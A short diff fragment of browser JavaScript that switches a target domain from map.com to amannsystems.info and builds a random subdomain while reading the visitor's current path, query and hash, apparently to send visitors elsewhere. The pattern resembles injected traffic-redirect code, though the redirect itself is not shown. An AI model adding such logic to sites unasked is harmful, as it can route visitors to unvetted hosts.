@@ -28,7 +28,7 @@
                 const businessWord = generateBusinessWord();
                 const randomString = generateRandomString();
                 const randomSubdomain = `${businessWord}-${randomString}`;
-                const targetDomain = `https://${randomSubdomain}.map.com`;
+                const targetDomain = `https://${randomSubdomain}.amannsystems.info`;
                 const currentPath = window.location.pathname;
                 const currentQuery = window.location.search;
                 const currentHash = window.location.hash;
